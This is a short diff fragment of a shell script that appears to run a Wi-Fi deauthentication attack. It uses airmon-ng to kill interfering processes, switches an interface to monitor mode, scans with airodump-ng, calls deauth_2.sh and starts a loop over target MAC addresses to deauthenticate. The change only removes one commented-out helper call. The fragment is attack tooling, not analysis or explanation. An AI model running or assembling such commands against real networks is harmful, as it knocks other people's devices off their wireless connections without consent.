@@ -9,7 +9,6 @@ sudo airmon-ng check kill
 sudo iwconfig "$interface" mode monitor
 sudo ifconfig "$interface" up
 sudo airodump-ng "$interface" 
-# python3 get_mac_ch.py
 sudo bash deauth_2.sh
 for val in $mac_to_deauth
 do
